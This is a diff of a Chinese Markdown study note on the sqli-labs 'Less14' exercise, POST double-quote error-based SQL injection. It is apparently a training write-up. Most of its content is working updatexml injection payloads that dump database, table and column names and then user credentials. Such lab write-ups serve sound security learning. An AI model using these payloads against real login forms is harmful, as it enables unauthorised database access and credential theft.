@@ -1,29 +1,37 @@
-# Less14
+# Less14 — POST 双引号报错注入
 
-　　这关关于")闭合报错post注入
+## 关键信息
 
-　　判断是否存在注入：?id=1") and 1=1 --+
+| 项目 | 内容 |
+|------|------|
+| 类型 | POST |
+| 闭合 | `"` |
+| SQL | `WHERE username="$uname" and password="$passwd"` |
+| 报错 | ✅ `print_r(mysql_error())` |
+| 回显 | ❌（只显示 flag/slap 图片） |
+| 注入方式 | 报错注入（UNION 无回显） |
 
-　　报错说明存在注入
+## 判断是否存在注入
 
-![image](assets/image-20250426212328-iti37a6.png)
+uname 注入，passwd 随便填：
 
-　　‍
+```
+uname=1" and 1=1 --+   → flag ✅
+uname=1" and 1=2 --+   → slap ❌
+```
 
-　　这里应该使用报错注入：
+## 报错注入 payload（Burp 里改 uname 值）
 
-　　判断库名：" union select updatexml(1,concat(0x7e,(select database()),0x7e),1) #
+```
+# 爆数据库名
+uname=1" and updatexml(1,concat(0x7e,(select database())),1) --+
 
-![image](assets/image-20250426212705-coke1ce.png)
+# 爆表名
+uname=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+
 
-　　判断表名：" union select updatexml(1,concat(0x7e,(select table\_name from information\_schema.tables where table\_schema\='security'limit 0,1),0x7e),1)--+
+# 爆字段
+uname=1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1) --+
 
-![image](assets/image-20250426212727-ddzx2fh.png)
-
-　　判断列名：" union select updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)--+
-
-![image](assets/image-20250426212755-w57fb51.png)
-
-　　判断数据：" union select updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)--+
-
-![image](assets/image-20250426212831-xxzor6r.png)
+# 爆数据
+uname=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1) --+
+```
